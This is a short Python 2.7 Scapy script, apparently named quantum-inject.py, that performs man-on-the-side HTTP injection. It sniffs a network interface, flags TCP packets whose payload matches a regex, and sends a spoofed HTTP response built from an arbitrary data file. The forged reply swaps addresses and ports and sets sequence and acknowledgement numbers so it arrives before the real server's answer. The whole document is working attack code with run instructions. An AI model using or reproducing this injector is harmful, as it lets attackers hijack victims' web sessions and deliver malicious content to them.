# python 2.7
# how to run: python quantum-inject.py -i network_interface -r regex --datafile filepath filter_expression
# example that I used during testing: python quantum-inject.py --interface en0 --regexp pvta --datafile datafile.txt "tcp and port 80"
import argparse
from scapy.all import *
import re
from time import *

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", default="en0", help="Network interface to listen on")
parser.add_argument("-r", "--regexp", help="A regular expression that will be used to flag packets")
parser.add_argument("-d", "--datafile", help="Used as the TCP Raw payload for the injected packet(s)")
parser.add_argument("expression", default="tcp and port 80", help="A filter for packet sniffing (eg 'tcp and port 80' for HTTP-only). MUST BE SURROUNDED BY QUOTATION MARKS")

args = parser.parse_args()
datafile = open(args.datafile,'r').read()

# callback, called for each sniffed packet
# Determine whether we should allow it or not.
def determine_bad_packet(packet):
    print packet[IP].src, packet[IP].dst
    # compile the given regex for use
    regex = re.compile(args.regexp)
    # If the regex has any matches in the tcp
    # payload, we should inject a packet!
    try:
        packet[TCP][Raw]
    except IndexError:
        return
    else:
        if re.search(regex, packet[TCP][Raw].load):
            print 'matched'
            inject_packet(packet)

# Given a flagged packet, injects a packet
def inject_packet (flagged_packet):
    # First, form the HTTP header
    time = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
    header_template = "HTTP/1.1 200 OK\r\nDate: " + time + "\r\nServer: Apache\r\nCache-Control: public, max-age=300\r\nConnection: close\r\nContent-type: text/html\r\n\r\n"
    # Complete the HTTP response by combining the datafile with the headers
    http_reponse = header_template + datafile
    # Spin up a new packet
    to_inject = Ether()/IP()/TCP()/http_reponse
    # Assign the packet its necessary values:
    #Ether fields: flip the src and dst
    to_inject[Ether].src = flagged_packet[Ether].dst
    to_inject[Ether].dst = flagged_packet[Ether].src
    # IP fields: flip src and dst, and increment ipid by some random amount
    to_inject[IP].src = flagged_packet[IP].dst
    to_inject[IP].dst = flagged_packet[IP].src
    to_inject[IP].id = flagged_packet[IP].id + 112
    # TCP fields: flip sport and dport, set ack and seq, set flags
    to_inject[TCP].sport = flagged_packet[TCP].dport
    to_inject[TCP].dport = flagged_packet[TCP].sport
    to_inject[TCP].ack = len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].seq = flagged_packet[TCP].ack
    to_inject[TCP].flags = "PA"
    # Delete ip length and chksum and tcp chksum so Scapy will recalculate them
    del to_inject[IP].len
    del to_inject[IP].chksum
    del to_inject[TCP].chksum
    # Send the packet!
    sendp(to_inject)

# sniff the given interface for tcp packets
packets = sniff(iface=args.interface, filter=args.expression,
    prn=determine_bad_packet)
